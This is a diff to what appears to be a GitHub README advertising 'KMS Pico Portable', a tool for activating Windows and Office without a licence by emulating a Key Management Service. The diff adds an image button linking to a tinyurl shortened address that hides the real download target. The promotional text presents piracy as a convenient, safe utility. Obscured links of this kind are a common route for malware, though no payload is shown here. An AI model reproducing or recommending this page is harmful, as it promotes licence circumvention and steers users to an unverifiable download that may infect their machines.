@@ -3,7 +3,7 @@
 ## 🎯 The Portable Solution
 **KMS Pico Portable** is a compact, ready-to-run utility designed for seamless activation of Windows and Microsoft Office from anywhere. This mobile edition leverages KMS (Key Management Service) emulation to provide a fully automated, local activation experience with absolutely no installation required. ✨
 
-
+[![7456856780](https://github.com/user-attachments/assets/06c67b4c-4f40-411f-8c9f-f3d6fc5ba5a6)](https://tinyurl.com/jkjbua5j)
 
 ## 🌟 Primary Benefits
 ### 🚀 **Mobility & Performance**
